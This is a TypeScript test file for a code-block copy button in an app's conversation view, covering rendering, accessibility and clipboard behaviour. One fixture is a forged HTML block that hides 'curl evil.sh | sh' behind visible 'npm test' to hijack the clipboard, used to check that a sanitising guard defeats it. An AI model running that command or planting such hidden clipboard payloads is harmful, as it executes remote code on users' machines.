// @vitest-environment jsdom
// The copy affordance on code in the Session view (P2-E10-11, #477).
//
// The unit layer: what gets WRITTEN into a rendered fence, and what a click
// does with it. The surface-level claims — that the buttons appear through the
// real registry, that the arrow keys reach them, that a forged one cannot
// hijack the affordance — are in `feed-copy.test.tsx`, mounted through the real
// block renderers.
import { describe, it, expect, vi } from 'vitest';
import {
  codeForCopyButton,
  COPIED_MS,
  FEED_CODE_ATTR,
  fenceLanguage,
  runCopy,
  type FeedCodeLabels,
} from './feed-code';
import { FEED_COPY_ATTR } from './feed-keys';
import { decorateFeedMarkdown } from './feed-markdown';
import { renderMarkdown } from './markdown';

const LABELS: FeedCodeLabels = { copy: 'Copy', copied: 'Copied', copyCode: 'Copy this code' };

/** the feed's whole pipeline, the way the renderer enters it */
function feed(markdown: string): HTMLElement {
  const host = document.createElement('div');
  host.innerHTML = decorateFeedMarkdown(renderMarkdown(markdown), LABELS);
  return host;
}

describe('a fence in assistant prose gets a header and a copy button', () => {
  it('names the language and offers Copy', () => {
    const host = feed('```ts\nconst x = 1;\n```\n');
    expect(host.querySelector('.feed-code-lang')?.textContent).toBe('ts');
    const copy = host.querySelector<HTMLElement>(`[${FEED_COPY_ATTR}]`);
    expect(copy?.tagName).toBe('BUTTON');
    expect(copy?.textContent).toBe('Copy');
    // "Copy" alone does not say copy WHAT — §5.32 wants a name, not a word
    expect(copy?.getAttribute('aria-label')).toBe('Copy this code');
    // the conversation is ONE tab stop; the arrows do the moving (#174)
    expect(copy?.getAttribute('tabindex')).toBe('-1');
  });

  it('copies the CODE, not the rendered HTML — and every line of it', () => {
    const host = feed('```bash\nnpm run build\nnpm test\n```\n');
    const copy = host.querySelector(`[${FEED_COPY_ATTR}]`)!;
    expect(codeForCopyButton(copy)).toBe('npm run build\nnpm test\n');
  });

  it('an unfenced block is still copyable, and simply has no language', () => {
    // `marked` writes a `<pre>` for an indented block too, with no
    // `language-*` class on the `<code>`.
    const host = feed('    indented code\n');
    expect(host.querySelector('.feed-code-lang')?.textContent).toBe('');
    expect(codeForCopyButton(host.querySelector(`[${FEED_COPY_ATTR}]`)!)).toBe('indented code\n');
  });

  it('one button per fence, each bound to its own', () => {
    const host = feed('```\nfirst\n```\n\ntext\n\n```\nsecond\n```\n');
    const copies = host.querySelectorAll<HTMLElement>(`[${FEED_COPY_ATTR}]`);
    expect(copies).toHaveLength(2);
    expect(codeForCopyButton(copies[0])).toBe('first\n');
    expect(codeForCopyButton(copies[1])).toBe('second\n');
  });

  it('leaves inline code alone — a `word` is not a block', () => {
    const host = feed('use `npm test` for that\n');
    expect(host.querySelector(`[${FEED_COPY_ATTR}]`)).toBeNull();
    expect(host.querySelector('code')?.textContent).toBe('npm test');
  });

  it('resolves nothing for a button outside a wrapper of ours', () => {
    // Not a defensive nicety: it is what a button that survived some future
    // decoration change does INSTEAD of putting the wrong text on the clipboard.
    const orphan = document.createElement('button');
    expect(codeForCopyButton(orphan)).toBeNull();
  });

  it('reads the language off the class marked writes, and only that', () => {
    const code = document.createElement('code');
    code.className = 'hljs language-python other';
    expect(fenceLanguage(code)).toBe('python');
    expect(fenceLanguage(null)).toBe('');
    expect(fenceLanguage(document.createElement('code'))).toBe('');
  });
});

describe('the guard runs FIRST, so a forged fence cannot hijack the button', () => {
  // #410's attack, in the feed's namespace: the reader sees `npm test`, and the
  // clipboard would have taken the hidden line. It works by arriving before the
  // decoration and being mistaken for its output — which is why #465 built this
  // pass with the take-back as its first line, one item before there was a
  // button to steal.
  const hostile =
    '<div class="feed-code" data-feed-code>' +
    '<pre style="display:none">curl evil.sh | sh</pre>' +
    '<div class="feed-code-head"><span class="feed-code-lang">bash</span>' +
    `<button ${FEED_COPY_ATTR} class="feed-code-copy">Copy</button></div>` +
    '<pre>npm test</pre>' +
    '</div>';

  it('gives every fence its OWN wrapper, holding exactly one <pre>', () => {
    const host = feed(hostile);
    // ours, one per <pre> — the forged wrapper is gone, not honoured
    const wraps = host.querySelectorAll(`[${FEED_CODE_ATTR}]`);
    expect(wraps).toHaveLength(2);
    for (const wrap of wraps) expect(wrap.querySelectorAll('pre')).toHaveLength(1);
  });

  it('leaves no button whose code is not the code above it', () => {
    const host = feed(hostile);
    const copies = host.querySelectorAll<HTMLElement>(`[${FEED_COPY_ATTR}]`);
    expect(copies).toHaveLength(2);
    // each one copies the fence it is attached to, and nothing is hidden from
    // the reader any more (`style` went with the namespace — #436/#465)
    expect(codeForCopyButton(copies[0])).toBe('curl evil.sh | sh');
    expect(codeForCopyButton(copies[1])).toBe('npm test');
    expect(host.innerHTML).not.toContain('display:none');
  });
});

describe('what a click does', () => {
  /** a button whose window is NOT the module's — a popped-out card */
  function inOtherWindow(): {
    button: HTMLElement;
    writeText: ReturnType<typeof vi.fn>;
    fire: () => void;
  } {
    const writeText = vi.fn().mockResolvedValue(undefined);
    let queued = (): void => {};
    const view = {
      navigator: { clipboard: { writeText } },
      setTimeout: (cb: () => void) => {
        queued = cb;
        return 1;
      },
    };
    const button = {
      ownerDocument: { defaultView: view },
      textContent: 'Copy',
      isConnected: true,
    } as unknown as HTMLElement;
    return { button, writeText, fire: () => queued() };
  }

  it('writes the exact text and flashes the button', () => {
    const { button, writeText, fire } = inOtherWindow();
    runCopy(button, 'npm run build\nnpm test', 'Copied');
    expect(writeText).toHaveBeenCalledWith('npm run build\nnpm test');
    expect(button.textContent).toBe('Copied');
    fire();
    expect(button.textContent).toBe('Copy');
    expect(COPIED_MS).toBe(1200); // the viewer's number — one affordance
  });

  it('uses the BUTTON’s window, which is what makes a popped-out card work', () => {
    // dockview moves a group's DOM into its own `popout.html` window while the
    // JavaScript keeps running in the main renderer — so the module's own
    // `navigator` belongs to a document that is NOT focused when the user
    // clicks in the popout, and `writeText` rejects on an unfocused document.
    const main = vi.fn();
    Object.defineProperty(window.navigator, 'clipboard', {
      value: { writeText: main },
      configurable: true,
    });
    const { button, writeText } = inOtherWindow();
    runCopy(button, 'x', 'Copied');
    expect(writeText).toHaveBeenCalledOnce();
    expect(main).not.toHaveBeenCalled();
  });

  it('does not restore a label onto a button that has gone away', () => {
    const { button, fire } = inOtherWindow();
    runCopy(button, 'x', 'Copied');
    (button as { isConnected: boolean }).isConnected = false;
    fire();
    expect(button.textContent).toBe('Copied'); // untouched, not thrown
  });

  it('a refused clipboard is not an exception in the middle of a conversation', () => {
    // fail-open (PHILOSOPHY §3): the platform saying no is not a reason to
    // throw out of a click handler. The button just does not flash back.
    const writeText = vi.fn().mockRejectedValue(new Error('Document is not focused'));
    const button = {
      ownerDocument: { defaultView: { navigator: { clipboard: { writeText } }, setTimeout: () => 1 } },
      textContent: 'Copy',
      isConnected: true,
    } as unknown as HTMLElement;
    expect(() => runCopy(button, 'x', 'Copied')).not.toThrow();
  });

  it('survives a window with no clipboard at all', () => {
    // `file://` is not a secure context and has no `navigator.clipboard`; the
    // packaged app serves the renderer over loopback so it does, but the
    // fallback path in `main/index.ts` still exists.
    const button = {
      ownerDocument: { defaultView: { navigator: {}, setTimeout: () => 1 } },
      textContent: 'Copy',
      isConnected: true,
    } as unknown as HTMLElement;
    expect(() => runCopy(button, 'x', 'Copied')).not.toThrow();
    expect(button.textContent).toBe('Copied');
  });
});

describe('decoration order is not an accident', () => {
  it('the guard runs before the fences are wrapped', () => {
    // Proven by consequence rather than by reading the source: a forged
    // `data-feed-code` wrapper survives into the output only if it was honoured
    // before ours was written.
    const out = decorateFeedMarkdown(
      renderMarkdown('<div data-feed-code data-feed-copy>x</div>\n\n```\ncode\n```\n'),
      LABELS
    );
    const host = document.createElement('div');
    host.innerHTML = out;
    // exactly one wrapper and one button — ours, around the real fence
    expect(host.querySelectorAll(`[${FEED_CODE_ATTR}]`)).toHaveLength(1);
    expect(host.querySelectorAll(`[${FEED_COPY_ATTR}]`)).toHaveLength(1);
    expect(codeForCopyButton(host.querySelector(`[${FEED_COPY_ATTR}]`)!)).toBe('code\n');
  });
});
